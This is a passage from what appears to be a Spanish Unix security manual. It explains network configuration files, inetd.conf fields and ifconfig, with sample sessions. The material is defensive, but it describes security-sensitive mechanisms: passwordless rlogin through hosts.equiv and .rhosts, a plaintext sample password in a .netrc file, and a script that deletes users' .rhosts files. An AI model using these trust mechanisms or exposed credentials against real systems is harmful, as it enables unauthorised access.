local, de forma que para comunicaci&#x00F3;n dentro de la red no se tenga que recurrir a DNS a la
hora de resolver un nombre de m&#x00E1;quina. El formato de una l&#x02CA;&#x0131;nea de este &#xFB01;chero puede ser el
siguiente:

     </para><literallayout role="verbatim">
&#x00A0;158.42.2.1&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;pleione&#x00A0;pleione.cc.upv.es&#x00A0;pleione.upv.es
</literallayout>
<!--l. 41--><para>Esta l&#x02CA;&#x0131;nea indica que ser&#x00E1; equivalente utilizar la direcci&#x00F3;n 158.42.2.1, el nombre de m&#x00E1;quina pleione, o
los aliases pleione.cc.upv.es y pleione.upv.es cuando queramos comunicarnos con este
servidor:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;telnet&#x00A0;pleione
&#x00A0;Trying&#x00A0;158.42.2.1...
&#x00A0;Connected&#x00A0;to&#x00A0;pleione.cc.upv.es
&#x00A0;Escape&#x00A0;character&#x00A0;is&#x00A0;&#x2019;&#x02C6;]&#x2019;.
&#x00A0;Connection&#x00A0;closed&#x00A0;by&#x00A0;foreign&#x00A0;host.
&#x00A0;luisa:~#&#x00A0;telnet&#x00A0;158.42.2.1
&#x00A0;Trying&#x00A0;158.42.2.1...
&#x00A0;Connected&#x00A0;to&#x00A0;pleione.cc.upv.es
&#x00A0;Escape&#x00A0;character&#x00A0;is&#x00A0;&#x2019;&#x02C6;]&#x2019;.
&#x00A0;Connection&#x00A0;closed&#x00A0;by&#x00A0;foreign&#x00A0;host.
&#x00A0;luisa:~#
</literallayout>
<!--l. 62--><para>
  </para></section><!--end subsection--><!--l. 62--><section 
role="subsection"><title><abbrev role="title-mark">13.2.2</abbrev><anchor 
   id="x1-19000013.2.2"  ></anchor>El archivo /etc/ethers</title>
<!--l. 63--><para>  De la misma forma que en /etc/hosts se establec&#x02CA;&#x0131;a una correspondencia entre nombres de m&#x00E1;quina y sus
direcciones IP, en este &#xFB01;chero se establece una correspondencia entre nombres de m&#x00E1;quina y direcciones
ethernet, en un formato muy similar al archivo anterior:

     </para><literallayout role="verbatim">
&#x00A0;00:20:18:72:c7:95&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;pleione.cc.upv.es
</literallayout>
<!--l. 74--><para>En la actualidad el archivo /etc/ethers no se suele encontrar (aunque para el sistema sigue conservando su
funcionalidad, es decir, si existe se tiene en cuenta) en casi ninguna m&#x00E1;quina Unix, ya que las direcciones
hardware se obtienen por ARP. No obstante, a&#x00FA;n resulta &#x00FA;til en determinados casos, por ejemplo en
cortafuegos con tarjetas quad donde todas las interfaces de la tarjeta tienen la misma direcci&#x00F3;n
MAC.
  </para></section><!--end subsection--><!--l. 81--><section 
role="subsection"><title><abbrev role="title-mark">13.2.3</abbrev><anchor 
   id="x1-19100013.2.3"  ></anchor>El &#xFB01;chero /etc/networks</title>
<!--l. 82--><para>  Este &#xFB01;chero, cada vez m&#x00E1;s en desuso, permite asignar un nombre simb&#x00F3;lico a las redes, de una forma
similar a lo que /etc/hosts hace con las m&#x00E1;quinas. En cada l&#x02CA;&#x0131;nea del &#xFB01;chero se especi&#xFB01;ca un nombre de
red, su direcci&#x00F3;n, y sus aliases:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;cat&#x00A0;/etc/networks
&#x00A0;loopback&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;127.0.0.0
&#x00A0;localnet&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;192.168.0.0
&#x00A0;luisa:~#
</literallayout>
<!--l. 94--><para>El uso de este &#xFB01;chero es casi exclusivo del arranque del sistema, cuando a&#x00FA;n no se dispone de servidores de
nombres; en la operaci&#x00F3;n habitual del sistema no se suele utilizar, ya que ha sido desplazado por
DNS.
  </para></section><!--end subsection--><!--l. 97--><section 
role="subsection"><title><abbrev role="title-mark">13.2.4</abbrev><anchor 
   id="x1-19200013.2.4"  ></anchor>El &#xFB01;chero /etc/services</title>
<!--l. 98--><para>  En cada l&#x02CA;&#x0131;nea de este &#xFB01;chero se especi&#xFB01;can el nombre, n&#x00FA;mero de puerto, protocolo utilizado y aliases de
todos los servicios de red existentes (o, si no de todos los existentes, de un subconjunto lo su&#xFB01;cientemente
amplio para que ciertos programas de red funcionen correctamente). Por ejemplo, para especi&#xFB01;car que el
servicio de smtp utilizar&#x00E1; el puerto 25, el protocolo TCP y que un alias para &#x00E9;l es mail, existir&#x00E1; una l&#x02CA;&#x0131;nea
similar a la siguiente:

     </para><literallayout role="verbatim">
&#x00A0;smtp&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;25/tcp&#x00A0;&#x00A0;&#x00A0;mail
</literallayout>
<!--l. 112--><para>El &#xFB01;chero /etc/services es utilizado por los servidores y por los clientes para obtener el n&#x00FA;mero de puerto
en el que deben escuchar o al que deben enviar peticiones, de forma que se pueda cambiar (aunque no es lo
habitual) un n&#x00FA;mero de puerto sin afectar a las aplicaciones; de esta forma, podemos utilizar el nombre del
servicio en un programa y la funci&#x00F3;n getservicebyname() en lugar de utilizar el n&#x00FA;mero del
puerto:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;telnet&#x00A0;anita&#x00A0;25
&#x00A0;Trying&#x00A0;192.168.0.3...
&#x00A0;Connected&#x00A0;to&#x00A0;anita.
&#x00A0;Escape&#x00A0;character&#x00A0;is&#x00A0;&#x2019;&#x02C6;]&#x2019;.
&#x00A0;220&#x00A0;anita&#x00A0;ESMTP&#x00A0;Sendmail&#x00A0;8.9.1b+Sun/8.9.1;&#x00A0;Sun,&#x00A0;31&#x00A0;Oct&#x00A0;1999&#x00A0;06:43:06&#x00A0;GMT
&#x00A0;quit
&#x00A0;221&#x00A0;anita&#x00A0;closing&#x00A0;connection
&#x00A0;Connection&#x00A0;closed&#x00A0;by&#x00A0;foreign&#x00A0;host.
&#x00A0;luisa:~#&#x00A0;telnet&#x00A0;anita&#x00A0;smtp
&#x00A0;Trying&#x00A0;192.168.0.3...
&#x00A0;Connected&#x00A0;to&#x00A0;anita.
&#x00A0;Escape&#x00A0;character&#x00A0;is&#x00A0;&#x2019;&#x02C6;]&#x2019;.
&#x00A0;220&#x00A0;anita&#x00A0;ESMTP&#x00A0;Sendmail&#x00A0;8.9.1b+Sun/8.9.1;&#x00A0;Sun,&#x00A0;31&#x00A0;Oct&#x00A0;1999&#x00A0;06:43:20&#x00A0;GMT
&#x00A0;quit
&#x00A0;221&#x00A0;anita&#x00A0;closing&#x00A0;connection
&#x00A0;Connection&#x00A0;closed&#x00A0;by&#x00A0;foreign&#x00A0;host.
&#x00A0;luisa:~#
</literallayout>
<!--l. 139--><para>Este &#xFB01;chero NO se utiliza para habilitar o deshabilitar servicios, sino como hemos dicho, simplemente para
obtener n&#x00FA;meros de puerto a partir de nombres de servicio y viceversa.
  </para></section><!--end subsection--><!--l. 142--><section 
role="subsection"><title><abbrev role="title-mark">13.2.5</abbrev><anchor 
   id="x1-19300013.2.5"  ></anchor>El &#xFB01;chero /etc/protocols</title>
<!--l. 143--><para>  El sistema de red en Unix utiliza un n&#x00FA;mero especial, denominado n&#x00FA;mero de protocolo, para
identi&#xFB01;car el protocolo de transporte espec&#x02CA;&#x0131;&#xFB01;co que la m&#x00E1;quina recibe; esto permite al software
de red decodi&#xFB01;car correctamente la informaci&#x00F3;n recibida. En el archivo /etc/protocols se
identi&#xFB01;can todos los protocolos de transporte reconocidos junto a su n&#x00FA;mero de protocolo y sus
aliases:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;cat&#x00A0;/etc/protocols
&#x00A0;ip&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;IP&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;#&#x00A0;internet&#x00A0;protocol,&#x00A0;pseudo&#x00A0;protocol&#x00A0;number
&#x00A0;icmp&#x00A0;&#x00A0;&#x00A0;&#x00A0;1&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;ICMP&#x00A0;&#x00A0;&#x00A0;&#x00A0;#&#x00A0;internet&#x00A0;control&#x00A0;message&#x00A0;protocol
&#x00A0;igmp&#x00A0;&#x00A0;&#x00A0;&#x00A0;2&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;IGMP&#x00A0;&#x00A0;&#x00A0;&#x00A0;#&#x00A0;internet&#x00A0;group&#x00A0;multicast&#x00A0;protocol
&#x00A0;ggp&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;3&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;GGP&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;#&#x00A0;gateway-gateway&#x00A0;protocol
&#x00A0;tcp&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;6&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;TCP&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;#&#x00A0;transmission&#x00A0;control&#x00A0;protocol
&#x00A0;pup&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;12&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;PUP&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;#&#x00A0;PARC&#x00A0;universal&#x00A0;packet&#x00A0;protocol
&#x00A0;udp&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;17&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;UDP&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;#&#x00A0;user&#x00A0;datagram&#x00A0;protocol
&#x00A0;idp&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;22&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;IDP&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;#&#x00A0;WhatsThis?
&#x00A0;raw&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;255&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;RAW&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;#&#x00A0;RAW&#x00A0;IP&#x00A0;interface
&#x00A0;luisa:~#
</literallayout>
<!--l. 164--><para>No es usual &#x2013; ni recomendable &#x2013; que el administrador modi&#xFB01;que este &#xFB01;chero; es el software de red el que lo
va actualizando al ser instalado en la m&#x00E1;quina
  </para></section><!--end subsection--><!--l. 167--><section 
role="subsection"><title><abbrev role="title-mark">13.2.6</abbrev><anchor 
   id="x1-19400013.2.6"  ></anchor>El &#xFB01;chero /etc/hosts.equiv</title>
<!--l. 168--><para>  En este &#xFB01;chero se indican, una en cada l&#x02CA;&#x0131;nea, las m&#x00E1;quinas con&#xFB01;ables. &#x00BF;Qu&#x00E9; signi&#xFB01;ca con&#xFB01;ables? B&#x00E1;sicamente
que con&#xFB01;amos en su seguridad tanto como en la nuestra, por lo que para facilitar la compartici&#x00F3;n de
recursos, no se van a pedir contrase~nas a los usuarios que quieran conectar desde estas m&#x00E1;quinas con el
mismo login, utilizando las &#x00F3;rdenes BSD r<informalequation><graphic 
fileref="unixsec277x.gif"></graphic></informalequation> (rlogin, rsh, rcp&#x2026;). Por ejemplo, si en el &#xFB01;chero
/etc/hosts.equiv del servidor maquina1 hay una entrada para el nombre de host maquina2, cualquier
usuario <anchor 
   id="x1-194001f1"  ></anchor><footnote><para>     Excepto el root.</para></footnote>
de este sistema puede ejecutar una orden como la siguiente para conectar a maquina1 &#x00A1;sin necesidad de
ninguna clave!:

     </para><literallayout role="verbatim">
&#x00A0;maquina2:~$&#x00A0;rlogin&#x00A0;maquina1
&#x00A0;Last&#x00A0;login:&#x00A0;Sun&#x00A0;Oct&#x00A0;31&#x00A0;08:27:54&#x00A0;from&#x00A0;localhost
&#x00A0;Sun&#x00A0;Microsystems&#x00A0;Inc.&#x00A0;&#x00A0;&#x00A0;SunOS&#x00A0;5.7&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Generic&#x00A0;October&#x00A0;1998
&#x00A0;maquina1:~$
</literallayout>
<!--l. 187--><para>Obviamente, esto supone un gran problema de seguridad, por lo que lo m&#x00E1;s recomendable es que el &#xFB01;chero
/etc/hosts.equiv est&#x00E9; vac&#x02CA;&#x0131;o o no exista. De la misma forma, los usuarios pueden crear &#xFB01;cheros
$HOME/.rhosts para establecer un mecanismo de con&#xFB01;abilidad bastante similar al de /etc/hosts.equiv;
es importante para la seguridad de nuestro sistema el controlar la existencia y el contenido de estos
archivos .rhosts. Por ejemplo, podemos aprovechar las facilidades de plani&#xFB01;caci&#x00F3;n de tareas de Unix
para, cada cierto tiempo, chequear los directorios $HOME de los usuarios en busca de estos
&#xFB01;cheros, elimin&#x00E1;ndolos si los encontramos. Un shellscript que hace esto puede ser el siguiente:

     </para><literallayout role="verbatim">
&#x00A0;#!/bin/sh
&#x00A0;for&#x00A0;i&#x00A0;in&#x00A0;&#x2018;cat&#x00A0;/etc/passwd&#x00A0;|awk&#x00A0;-F:&#x00A0;&#x2019;{print&#x00A0;$6}&#x2019;&#x2018;;&#x00A0;do
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;cd&#x00A0;$i
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;if&#x00A0;[&#x00A0;-f&#x00A0;.rhosts&#x00A0;];&#x00A0;then
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;echo&#x00A0;&#x0022;$i/.rhosts&#x00A0;detectado&#x0022;|mail&#x00A0;-s&#x00A0;&#x0022;rhosts&#x0022;&#x00A0;root
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;rm&#x00A0;-f&#x00A0;$i/.rhosts
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;fi
&#x00A0;done
</literallayout>
<!--l. 210--><para>Este programa env&#x02CA;&#x0131;a un correo al root en caso de encontrar un &#xFB01;chero .rhosts, y lo elimina; podemos
plani&#xFB01;carlo mediante cron para que se ejecute, por ejemplo, cada cinco minutos (la forma de plani&#xFB01;carlo
depende del clon de Unix en el que trabajemos, por lo que se recomienda consultar la p&#x00E1;gina del manual de
cron o crond).
  </para></section><!--end subsection--><!--l. 215--><section 
role="subsection"><title><abbrev role="title-mark">13.2.7</abbrev><anchor 
   id="x1-19500013.2.7"  ></anchor>El &#xFB01;chero .netrc</title>
<!--l. 216--><para>  El mecanismo de autenticaci&#x00F3;n que acabamos de ver s&#x00F3;lo funciona con las &#x00F3;rdenes r* de Unix BSD; la
conexi&#x00F3;n v&#x02CA;&#x0131;a ftp seguir&#x00E1; solicitando un nombre de usuario y una clave para acceder a sistemas remotos. No
obstante, existe una forma de automatizar ftp para que no solicite estos datos, y es mediante el uso de un
archivo situado en el directorio $HOME de cada usuario (en la m&#x00E1;quina desde donde se invoca a ftp, no en
la servidora) y llamado .netrc. En este &#xFB01;chero se pueden especi&#xFB01;car, en texto claro, nombres de m&#x00E1;quina,
nombres de usuario y contrase~nas de sistemas remotos, de forma que al conectar a ellos la transferencia de
estos datos se realiza autom&#x00E1;ticamente, sin ninguna interacci&#x00F3;n con el usuario. Por ejemplo,
imaginemos que el usuario &#x2018;root&#x2019; del sistema luisa conecta habitualmente a rosita por ftp, con
nombre de usuario &#x2018;toni&#x2019;; en su $HOME de luisa puede crear un &#xFB01;chero .netrc como el
siguiente:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;cat&#x00A0;$HOME/.netrc
&#x00A0;machine&#x00A0;rosita
&#x00A0;login&#x00A0;toni
&#x00A0;password&#x00A0;h/l0&#x0026;54
&#x00A0;luisa:~#
</literallayout>
<!--l. 239--><para>Si este archivo existe, cuando conecte al sistema remoto no se le solicitar&#x00E1;n ning&#x00FA;n nombre de usuario ni
contrase~na:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;ftp&#x00A0;rosita
&#x00A0;Connected&#x00A0;to&#x00A0;rosita.
&#x00A0;220&#x00A0;rosita&#x00A0;FTP&#x00A0;server&#x00A0;(Version&#x00A0;wu-2.6.0(1)&#x00A0;Thu&#x00A0;Oct&#x00A0;21&#x00A0;12:27:00&#x00A0;EDT&#x00A0;1999)&#x00A0;ready.
&#x00A0;331&#x00A0;Password&#x00A0;required&#x00A0;for&#x00A0;toni.
&#x00A0;230&#x00A0;User&#x00A0;toni&#x00A0;logged&#x00A0;in.
&#x00A0;Remote&#x00A0;system&#x00A0;type&#x00A0;is&#x00A0;UNIX.
&#x00A0;Using&#x00A0;binary&#x00A0;mode&#x00A0;to&#x00A0;transfer&#x00A0;files.
&#x00A0;ftp&#x003E;
</literallayout>
<!--l. 253--><para>La existencia de &#xFB01;cheros .netrc en los $HOME de los usuarios se puede convertir en un grave problema
de seguridad: si un atacante consigue leer nuestro &#xFB01;chero .netrc, autom&#x00E1;ticamente obtiene
nuestro nombre de usuario y nuestra clave en un sistema remoto. Por tanto, no es de extra~nar
que para que el mecanismo funcione correctamente, este &#xFB01;chero s&#x00F3;lo puede ser le&#x02CA;&#x0131;do por su
propietario; si no es as&#x02CA;&#x0131;, no se permitir&#x00E1; el acceso al sistema remoto (aunque los datos de .netrc sean
correctos):

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;ftp&#x00A0;rosita
&#x00A0;Connected&#x00A0;to&#x00A0;rosita.
&#x00A0;220&#x00A0;rosita&#x00A0;FTP&#x00A0;server&#x00A0;(Version&#x00A0;wu-2.6.0(1)&#x00A0;Thu&#x00A0;Oct&#x00A0;21&#x00A0;12:27:00&#x00A0;EDT&#x00A0;1999)&#x00A0;ready.
&#x00A0;Error&#x00A0;-&#x00A0;.netrc&#x00A0;file&#x00A0;not&#x00A0;correct&#x00A0;permissions.
&#x00A0;Remove&#x00A0;password&#x00A0;or&#x00A0;correct&#x00A0;mode&#x00A0;(should&#x00A0;be&#x00A0;600).
&#x00A0;ftp&#x003E;
</literallayout>
<!--l. 270--><para>Existe una diferencia abismal entre el uso de .rhosts y el de .netrc; en el primer caso al menos
conseguimos que nuestra clave no se env&#x02CA;&#x0131;e a trav&#x00E9;s de la red, pero mediante .netrc lo &#x00FA;nico que conseguimos
es no tener que teclear la clave y el login expl&#x02CA;&#x0131;citamente: se env&#x02CA;&#x0131;an de forma autom&#x00E1;tica. Adem&#x00E1;s de esto,
si alguien consigue privilegios de administrador en la m&#x00E1;quina cliente, podr&#x00E1; leer los posibles
archivos .netrc que sus usuarios posean; por tanto, este mecanismo s&#x00F3;lo se ha de utilizar para
conexiones a sistemas remotos como usuario an&#x00F3;nimo (anonymous o ftp). Quiz&#x00E1;s nos convenga
rastrear peri&#x00F3;dicamente los directorios de conexi&#x00F3;n de nuestros usuarios en busca de archivos
.netrc, por ejemplo mediante un shellscript muy similar al que hemos visto para buscar &#xFB01;cheros
.rhosts.
  </para></section><!--end subsection--><!--l. 283--><section 
role="subsection"><title><abbrev role="title-mark">13.2.8</abbrev><anchor 
   id="x1-19600013.2.8"  ></anchor>El &#xFB01;chero /etc/inetd.conf</title>
<!--l. 284--><para>  Este &#xFB01;chero es el utilizado por el demonio inetd, conocido como el superservidor de red. El demonio
inetd es el encargado de ofrecer la mayor&#x02CA;&#x0131;a de servicios de nuestro equipo hacia el resto de m&#x00E1;quinas, y por
tanto debemos cuidar mucho su correcta con&#xFB01;guraci&#x00F3;n. Posteriormente hablaremos de c&#x00F3;mo restringir
servicios, tanto ofrecidos por este demonio como servidos independientemente.
<!--br/-->
<!--br/-->Cada l&#x02CA;&#x0131;nea (excepto las que comienzar por &#x2018;#&#x2019;, que son tratadas como comentarios) del archivo
/etc/inetd.conf le indica a inetd c&#x00F3;mo se ha de comportar cuando recibe una petici&#x00F3;n en cierto puerto;
en cada una de ellas existen al menos seis campos (en algunos clones de Unix pueden ser m&#x00E1;s, como se
explica en <citation>[?]</citation>), cuyo signi&#xFB01;cado es el siguiente:
     </para><itemizedlist>
     <listitem>
     <!--l. 297--><para>Servicio
     <!--br/-->Este campo indica el nombre del servicio asociado a la l&#x02CA;&#x0131;nea correspondiente de
     <!--br/-->/etc/inetd.conf; el nombre ha de existir en /etc/services para ser considerado correcto,
     o en /etc/rpc si se trata de servicios basados en el RPC (Remote Procedure Call) de Sun
     Microsystems. En este &#x00FA;ltimo caso se ha de acompa~nar el nombre del servicio con el n&#x00FA;mero de
     versi&#x00F3;n RPC, separando ambos con el car&#x00E1;cter &#x2018;/&#x2019;.
     </para></listitem>
     <listitem>
     <!--l. 304--><para>Socket
     <!--br/-->Aqu&#x02CA;&#x0131; se indica el tipo de socket asociado a la conexi&#x00F3;n. Aunque dependiendo del clon de Unix
     utilizado existen una serie de identi&#xFB01;cadores v&#x00E1;lidos, lo normal es que asociado al protocolo
     TCP se utilicen sockets de tipo stream, mientras que si el protocolo es UDP el tipo del socket
     sea dgram (datagrama).
     </para></listitem>
     <listitem>
     <!--l. 310--><para>Protocolo
     <!--br/-->El protocolo debe ser un protocolo de&#xFB01;nido en /etc/protocols, generalmente TCP o UDP. Si
     se trata de servicios RPC, de nuevo hay que indicarlo utilizando rpc antes del nombre del
     protocolo, separado de &#x00E9;l por el car&#x00E1;cter &#x2018;/&#x2019; al igual que suced&#x02CA;&#x0131;a con el nombre; por ejemplo,
     en este caso podr&#x02CA;&#x0131;amos tener protocolos como rpc/tcp o rpc/udp.

     </para></listitem>
     <listitem>
     <!--l. 317--><para>Concurrencia
     <!--br/-->El campo de concurrencia s&#x00F3;lamente es aplicable a sockets de tipo datagrama (dgram); el resto de
     tipos han de contener una entrada nowait en este campo. Si el servidor que ha de atender la
     petici&#x00F3;n es multihilo (es decir, puede anteder varias peticiones simult&#x00E1;neamente), hemos de
     indicarle al sistema de red que libere el socket asociado a una conexi&#x00F3;n de forma que inetd
     pueda seguir aceptando peticiones en dicho socket; en este caso utilizaremos la opci&#x00F3;n
     nowait. Si por el contrario se trata de un servidor unihilo (acepta peticiones de forma
     secuencial, hasta que no &#xFB01;naliza con una no puede escuchar la siguiente) especi&#xFB01;caremos
     wait.
     <!--br/-->
     <!--br/-->Especi&#xFB01;car correctamente el modelo de concurrencia a seguir en un determinado servicio es
     importante para nuestra seguridad, especialmente para prevenir ataques de negaci&#x00F3;n de servicio
     (DoS). Si especi&#xFB01;camos wait, inetd no podr&#x00E1; atender una petici&#x00F3;n hasta que no &#xFB01;nalice el servicio de
     la actual, por lo que si este servicio es muy costoso la segunda petici&#x00F3;n no ser&#x00E1; servida
     en un tiempo razonable (o incluso nunca, si inetd se queda bloqueado por cualquier
     motivo). Si por el contrario especi&#xFB01;camos nowait, el n&#x00FA;mero de conexiones simult&#x00E1;neas quiz&#x00E1;s
     llegue a ser lo su&#xFB01;cientemente grande como para degradar las prestaciones del sistema, lo
     que por supuesto no es conveniente para nosotros. Para evitar ataques de este estilo, la
     mayor&#x02CA;&#x0131;a de sistemas Unix actuales permiten especi&#xFB01;car (junto a wait o nowait, separado
     de &#x00E9;l por un punto) el n&#x00FA;mero m&#x00E1;ximo de peticiones a un servicio durante un intervalo
     de tiempo (generalmente un minuto), de forma que si este n&#x00FA;mero se sobrepasa inetd
     asume que alguien est&#x00E1; intentando una negaci&#x00F3;n de servicio contra &#x00E9;l, por lo que deja de
     ofrecer ese servicio durante cierto tiempo (algunos clones de Unix incluso paran inetd, es
     conveniente consultar la documentaci&#x00F3;n en cada caso). Como evidentemente esto tambi&#x00E9;n es una
     negaci&#x00F3;n de servicio, algo muy com&#x00FA;n entre administradores es aprovechar las facilidades de
     plani&#xFB01;caci&#x00F3;n de Unix para enviar cada poco tiempo la se~nal SIGHUP al demonio inetd, de
     forma que este relea su &#xFB01;chero de con&#xFB01;guraci&#x00F3;n y vuelva a funcionar normalmente. Por
     ejemplo, para conseguir esto podemos a~nadir a nuestro &#xFB01;chero crontab una l&#x02CA;&#x0131;nea como la
     siguiente:

         </para><literallayout role="verbatim">
&#x00A0;00,10,20,30,40,50&#x00A0;*&#x00A0;*&#x00A0;*&#x00A0;*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;pkill&#x00A0;-HUP&#x00A0;inetd
</literallayout>
     <!--l. 356--><para>Con esto conseguimos que inetd se recon&#xFB01;gure cada diez minutos (el equivalente a pkill en ciertos
     Unices es killall, pero es recomendable consultar el manual para asegurarse de lo que esta orden
     provoca).
     </para></listitem>
     <listitem>
     <!--l. 359--><para>Usuario
     <!--br/-->En este campo se ha de indicar el nombre de usuario bajo cuya identidad se ha de ejecutar el
     programa que atiende cada servicio; esto es as&#x02CA;&#x0131; para poder lanzar servidores sin que posean los
     privilegios del root, con lo que un posible error en su funcionamiento no tenga consecuencias
     excesivamente graves. Para el grupo, se asume el grupo primario del usuario especi&#xFB01;cado, aunque se
     puede indicar un grupo diferente indic&#x00E1;ndolo junto al nombre, separado de &#x00E9;ste por un
     punto.
     </para></listitem>
     <listitem>
     <!--l. 368--><para>Programa
     <!--br/-->Por &#x00FA;ltimo, en cada l&#x02CA;&#x0131;nea de /etc/inetd.conf hemos de indicar la ruta del programa encargado de
     servir cada petici&#x00F3;n que inetd recibe en un puerto determinado, junto a los argumentos de
     dicho programa. El servidor inetd es capaz de ofrecer peque~nos servicios basado en
     TCP por s&#x02CA;&#x0131; mismo, sin necesidad de invocar a otros programas; ejemplos de este tipo
     de servicios son time, echo o chargen. En este caso, el valor de este campo ha de ser
     internal.</para></listitem></itemizedlist>
<!--l. 377--><para>De esta forma, si en /etc/inetd.conf tenemos una l&#x02CA;&#x0131;nea como

     </para><literallayout role="verbatim">
&#x00A0;telnet&#x00A0;&#x00A0;stream&#x00A0;&#x00A0;tcp&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;nowait&#x00A0;&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;/usr/sbin/in.telnetd
</literallayout>
<!--l. 383--><para>entonces inetd sabe que cuando reciba una petici&#x00F3;n al puerto telnet ha de abrir un socket tipo stream (el
habitual para el protocolo TCP) y ejecutar fork() y exec() del programa
<!--br/-->/usr/sbin/in.telnetd, bajo la identidad de root.
  </para></section><!--end subsection--></section><!--end section--><!--l. 387--><section 
role="section"><title><abbrev role="title-mark">13.3</abbrev><anchor 
   id="x1-19700013.3"  ></anchor>Algunas &#x00F3;rdenes importantes</title>
<!--l. 388--><para>
  </para><!--l. 388--><section 
role="subsection"><title><abbrev role="title-mark">13.3.1</abbrev><anchor 
   id="x1-19800013.3.1"  ></anchor>La orden ifconfig</title>
<!--l. 389--><para>  La orden ifconfig se utiliza para con&#xFB01;gurar correctamente los interfaces de red de nuestro sistema
Unix; habitualmente con ifconfig se indican par&#x00E1;metros como la direcci&#x00F3;n IP de la m&#x00E1;quina, la m&#x00E1;scara de la
red local o la direcci&#x00F3;n de broadcast. Si como par&#x00E1;metros se recibe &#x00FA;nicamente un nombre de dispositivo,
ifconfig nos muestra su con&#xFB01;guraci&#x00F3;n en este momento:

     </para><literallayout role="verbatim">
&#x00A0;anita:/#&#x00A0;ifconfig&#x00A0;nei0
&#x00A0;nei0:&#x00A0;flags=863&#x003C;UP,BROADCAST,NOTRAILERS,RUNNING,MULTICAST&#x003E;&#x00A0;mtu&#x00A0;1500
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;inet&#x00A0;192.168.0.3&#x00A0;netmask&#x00A0;ffffff00&#x00A0;broadcast&#x00A0;192.168.0.255
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;ether&#x00A0;0:20:18:72:45:ad
&#x00A0;anita:/#
</literallayout>
<!--l. 406--><para>Ya hemos dicho que aqu&#x02CA;&#x0131; no vamos a hablar de la con&#xFB01;guraci&#x00F3;n de estos dispositivos, sino de sus
consideraciones de seguridad. Podemos utilizar ifconfig para detectar un funcionamiento an&#x00F3;malo de la
tarjeta de red; este &#x2018;funcionamiento an&#x00F3;malo&#x2019; suele ser la causa (siempre en cuanto a seguridad se trata) de
uno de los tres siguientes problemas:
     </para><itemizedlist>
     <listitem>
     <!--l. 412--><para>Direcci&#x00F3;n IP incorrecta.
     <!--br/-->Es posible que alguien est&#x00E9; realizando un ataque de tipo IP Spoo&#xFB01;ng utilizando nuestro sistema:
     si utilizamos la direcci&#x00F3;n IP de otro equipo, las peticiones que ir&#x02CA;&#x0131;an a &#x00E9;l van a llegar a nosotros <anchor 
   id="x1-198001f2"  ></anchor><footnote><para>     Si el otro equipo no est&#x00E1; activo; si lo est&#x00E1;, ninguno funcionar&#x00E1; correctamente.</para></footnote>.
     Estamos suplantando su identidad, hecho que un atacante puede aprovechar para capturar
     todo tipo de informaci&#x00F3;n (desde claves hasta correo electr&#x00F3;nico).
     </para></listitem>
     <listitem>
     <!--l. 420--><para>Direcci&#x00F3;n MAC incorrecta.
     <!--br/-->Esto puede denotar un ataque similar al anterior, pero m&#x00E1;s elaborado: estamos suplantando
